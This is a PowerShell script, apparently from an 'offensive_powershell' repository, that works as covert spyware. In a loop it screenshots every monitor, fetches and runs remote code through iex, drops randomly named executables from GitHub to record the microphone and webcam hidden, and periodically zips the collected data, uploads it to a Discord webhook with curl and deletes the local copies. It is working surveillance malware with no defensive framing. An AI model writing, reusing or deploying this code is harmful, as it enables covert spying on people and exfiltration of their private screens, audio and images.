$Webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"
$BaseDir = "$env:TEMP\$env:COMPUTERNAME`_$env:USERNAME`_data"
$mic_path = $null
$cam_path = $null
$Counter = 0

# Create spy dir
if(!(Test-Path -Path $BaseDir -PathType Container)) { 
    New-Item -Path $BaseDir -ItemType Directory -Force | Out-Null 
}

function Get-Paths {
    $raw = (iwr -Uri https://github.com/Soumyo001/offensive_powershell/raw/refs/heads/main/assets/paths.txt).Content
    $dropPaths = $raw -split "`n"
    $dropPaths = $dropPaths.Trim()
    return $dropPaths | % { 
        $t = iex "$_"
        try{
            if(-not(Test-Path -Path "$t" -PathType Container)){
                New-Item -Path "$t" -ItemType Directory -Force -ErrorAction SilentlyContinue
            }
        } finally { $t } 
    } | ? { if($null -ne $_) { Test-Path -Path "$_" -PathType Container } }
}

$dropPaths = Get-Paths

function Get-Tool {
    param(
        [string]$url, 
        [string]$name, 
        [string]$path
    )
    $path = Join-Path -Path $path -ChildPath "$name.exe"
    if(-not (Test-Path -Path $path -PathType Leaf)) {
        try {
            iwr -Uri $url -OutFile $path -UseBasicParsing -ErrorAction Stop
        } catch { " [-] Failed to download $name.exe: $($_.Message)" }
    }
    return $path
}

while ($true) {

    $Counter++
    $time = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
    $activeWindow = (Get-Process | Where-Object {$_.MainWindowTitle} | Sort-Object CPU -Descending | Select-Object -First 1).MainWindowTitle
    $foregroundProc = (Get-Process | Where-Object {$_.Id -eq (Get-Process -Id (Get-NetTCPConnection -State Established | Where-Object {$_.OwningProcess} | Select-Object -First 1).OwningProcess)}).Name
    try {
        $ip = (Invoke-RestMethod -Uri "https://ifconfig.me/ip" -TimeoutSec 3 -ErrorAction SilentlyContinue)
    } catch {}

    Add-Type -AssemblyName System.Windows.Forms,System.Drawing 

    foreach ($screen in [Windows.Forms.Screen]::AllScreens) {
        $bounds = $screen.Bounds
        try {
            $bmp      = New-Object System.Drawing.Bitmap ([int]$bounds.Width), ([int]$bounds.Height) 
            $graphics = [System.Drawing.Graphics]::FromImage($bmp) 
            $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.Size) 
            $overlay = "$env:USERNAME@$env:COMPUTERNAME | $time | Window: '$activeWindow' | Proc: $foregroundProc"

            if($ip) { $overlay += " | $ip" }

            $font = New-Object System.Drawing.Font("Consolas", 14, [System.Drawing.FontStyle]::Bold)
            $brush = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::Red)
            $graphics.DrawString($overlay, $font, $brush, 10, 10)
        
            $file = "$BaseDir\screen_$time`_monitor$($screen.DeviceName.Split('\')[-1]).png"
            $bmp.Save($file, [System.Drawing.Imaging.ImageFormat]::Png)
        }
        finally {
            $graphics.Dispose() 
            $bmp.Dispose() 
        }
    }

    if (-not ($dropPaths -is [array] -and $null -ne $dropPaths -and $dropPaths.Count -gt 0)){
        $dropPaths = Get-Paths
    }

    if( $Counter % 20 -eq 0 ) { # either mod with 12(3 min interval) or 20 (5 minute interval)
        if( -not( Test-Path -Path "$mic_path" -PathType Leaf ) ){
            $mic_path = $dropPaths | Get-Random
            $randomFileName = [System.IO.Path]::GetRandomFileName()
            $mic_path = Get-Tool -url "https://github.com/Soumyo001/offensive_powershell/raw/refs/heads/main/assets/micrecorder.exe" -name $randomFileName -path $mic_path
        }
        if( -not( Test-Path -Path "$cam_path" -PathType Leaf ) ){
            $cam_path = $dropPaths | Get-Random
            $randomFileName = [System.IO.Path]::GetRandomFileName()
            $cam_path = Get-Tool -url "https://github.com/Soumyo001/offensive_powershell/raw/refs/heads/main/assets/micrecorder.exe" -name $randomFileName -path $cam_path
        }
        $params = @("-o", "$BaseDir\mic.wav", "-d", "10")
        Start-Process $mic_path -WindowStyle Hidden -ArgumentList $params

        # Start-Process $mic_path -WindowStyle Hidden -ArgumentList "-o `"$BaseDir\mic.wav`" -d 10"
        
        $params2 = @("-o", "$BaseDir\cam.jpg")
        # Start-Process $cam_path -WindowStyle Hidden -ArgumentList "-o `"$BaseDir\cam.jpg`""
        Start-Process $cam_path -WindowStyle Hidden -ArgumentList $params2
        
    }

    if( $Counter % 240 -eq 0 ) {
        $zip = "$env:TEMP\$env:COMPUTERNAME`_$env:USERNAME`_$(Get-Date -f 'yyyy_MM_dd_HH_mm_ss').zip"
        Compress-Archive -Path "$BaseDir\*" -DestinationPath $zip -Force
        curl.exe -F "file=@$zip" $Webhook
        Remove-Item "$BaseDir\*" -Force -Recurse
        Remove-Item $zip -Force
        $Counter = 0
    }
    
    Start-Sleep -Seconds 15
}